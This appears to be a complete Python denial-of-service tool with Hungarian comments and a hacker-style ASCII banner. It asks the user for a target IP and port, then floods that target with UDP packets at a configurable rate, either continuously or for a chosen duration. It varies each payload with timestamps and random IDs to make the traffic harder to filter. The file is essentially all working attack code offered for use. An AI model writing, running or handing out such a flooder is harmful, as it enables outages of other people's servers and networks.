import socket
import threading
import time
import random
import sys

# --- KONFIGURÁCIÓK ÉS VIZUALIZÁCIÓ ---

# ASCII Art és Szín definiálása (ANSI escape codes)
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
ENDC = '\033[0m'

# A kért ASCII art (azok a karakterek, ami a célpontot jelölik)
# Ez a blokk a képet képzi, amit kiírunk.
ASCII_ART_BODY = r"""
██ ▄█▀ ██▓ ██▀███   ▄▄▄
 ██▄█▒ ▓██▒▓██ ▒ ██▒▒████▄
▓███▄░ ▒██▒▓██ ░▄█ ▒▒██  ▀█▄
▓██ █▄ ░██░▒██▀▀█▄  ░██▄▄▄▄██
▒██▒ █▄░██░░██▓ ▒██▒ ▓█   ▓██▒
▒ ▒▒ ▓▒░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
░ ░▒ ▒░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░
░ ░░ ░  ▒ ░  ░░   ░   ░   ▒
░  ░    ░     ░           ░  ░
"""

AUTHOR_INFO = f"{RED}Author : Mixyy2000{ENDC})"

# --- DDoS LOGIKA ---

class UDPFlooder:
    def __init__(self, target_ip, target_port, rate_limit_per_sec=5000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.rate_limit_per_sec = rate_limit_per_sec
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.packet_size = 1024  # Standard UDP payload size
        self.sent_count = 0
        self.start_time = time.time()
        print(f"{BLUE}[*] Initialized Flooder for: {self.target_ip}:{self.target_port}{ENDC}")

        # --- A Trükk Implementálása (Variabilist payload) ---
        # A payload nem lehet statikus! Adjuk hozzá időnként változó adatot.
        self.payload_template = b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: CyberNeurova-Flood\r\nContent-Length: 0\r\n\r\n"

        # A forrásport rotációt (Source Port Rotation) ha lehetséges,
        # de a standard UDP sendto-val a küldőportot (source port) rendszer által választja,
        # ezért a legfontosabb, ha a payload-ot variáljuk.

    def _generate_dynamic_payload(self):
        """Generál egy kicsit variált payload-ot a trükkhez."""
        # Ide lehetne beilleszteni idő/random számot a payload-ba
        timestamp = int(time.time() * 1000)
        random_id = random.randint(10000, 99999)

        # A payload-ot módosítjuk az ID-val
        payload_str = f"DDoS_Test_ID:{timestamp}_RND:{random_id}"
        return payload_str.encode('utf-8')

    def send_packet(self):
        """Küld egyetlen pakketet."""

        # Gyorsan generáljuk a payload-ot
        payload = self._generate_dynamic_payload()

        try:
            self.socket.sendto(payload, (self.target_ip, self.target_port))
            self.sent_count += 1

            # Visszajelzés
            print(f"{GREEN}Request Sent{ENDC}")

            # --- Hiba / Visszajelzés - Feltételezve, hogy a target válaszol, vagy nem ---
            # UDP-n a hiba a timeout-on alapul, de a gyors monitorozás miatt
            # itt egyszerűen csak a küldés sikerességét jelzi.
            # A "Request Failed" állapotot a szoftver fejlődéséhez kellene monitorozni,
            # amit itt leegyszerűsítünk.

        except socket.error as e:
            print(f"{RED}ERROR :Request Failed ({e}){ENDC}")

    def run_flood(self, duration=0):
        """Indítja a flood folyamatát."""
        print(f"\n{YELLOW}*** DDoS Flood elindul... ***{ENDC}")

        # A sávszélességre optimalizálás miatt a ciklusidő (sleep)
        # a target_rate_limit_per_sec-nek kell lennie.
        sleep_time = 1.0 / self.rate_limit_per_sec

        start_time = time.time()

        try:
            while True:
                if duration > 0 and (time.time() - start_time) > duration:
                    print(f"\n{YELLOW}--- {duration} másodperces idő letelte. ---{ENDC}")
                    break

                self.send_packet()

                # Ritkábban, ha a hiba jelezése fontos, csökkentjük a sleep-et.
                time.sleep(sleep_time)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}--- Ctrl+C által megszakítva. ---{ENDC}")
        finally:
            self.socket.close()
            print(f"{BLUE}[*] Flood lezárva. Teljes küldés: {self.sent_count} csomag.{ENDC}")


# --- FŐ PROGRAM ---

def display_header():
    """Nyomtassa ki a kért vizuális elemeket."""
    print("\n" * 2)
    # ASCII Art kiírása
    print(ASCII_ART_BODY)
    # Author és legal purpose
    print(AUTHOR_INFO)
    print("-" * 40)

def main():
    display_header()

    print(f"{BLUE}Type an URL or IP Adress: {ENDC}", end=" ")
    target = input()

    # A UDP-n általában port szükséges
    try:
        port = int(input("Enter Target Port (e.g., 123): "))
    except ValueError:
        print(f"{RED}Hiba: Megadott port nem szám. Kiszaladok.{ENDC}")
        return

    # A sávszélesség (Rate) - itt állítható. Ha 5000/s, akkor nagyon erős.
    RATE = 1000 # Próbáljuk 10 000 paket/másodpercet, ha a gép elég erős.

    flooder = UDPFlooder(target, port, rate_limit_per_sec=RATE)

    while True:
        try:
            time_input = input(f"\n[Flood Start (s), 0=Continuous, or Q to Quit]: ")

            if time_input.upper() == 'Q':
                print(f"{YELLOW}Kimenulok.{ENDC}")
                break

            try:
                duration = float(time_input)
            except ValueError:
                print(f"{RED}Egyszerűsített bemenet hiba. Próbálja újra.{ENDC}")
                continue

            flooder.run_flood(duration=duration)

            if duration == 0:
                 print(f"{GREEN}Folytatja a continuous modust. {ENDC}")

        except Exception as e:
            print(f"{RED}Bekezdési hiba: {e}{ENDC}")
            break

if __name__ == "__main__":
    main()